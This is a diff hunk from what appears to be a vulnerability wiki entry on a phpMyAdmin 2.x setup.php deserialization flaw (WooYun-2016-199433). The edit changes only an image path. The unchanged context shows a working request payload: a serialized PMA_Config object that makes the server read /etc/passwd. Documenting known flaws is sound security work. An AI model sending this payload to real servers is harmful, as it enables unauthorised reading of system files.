@@ -29,7 +29,7 @@ phpmyadmin 2.x
 
     action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
 
-![1.png](/Users/aresx/Documents/VulWiki/.resource/(WooYun-2016-199433)Phpmyadminscripts_setup.php反序列化漏洞/media/rId24.png)
+![1.png](./.resource/(WooYun-2016-199433)Phpmyadminscripts_setup.php反序列化漏洞/media/rId24.png)
 
 参考链接
 --------
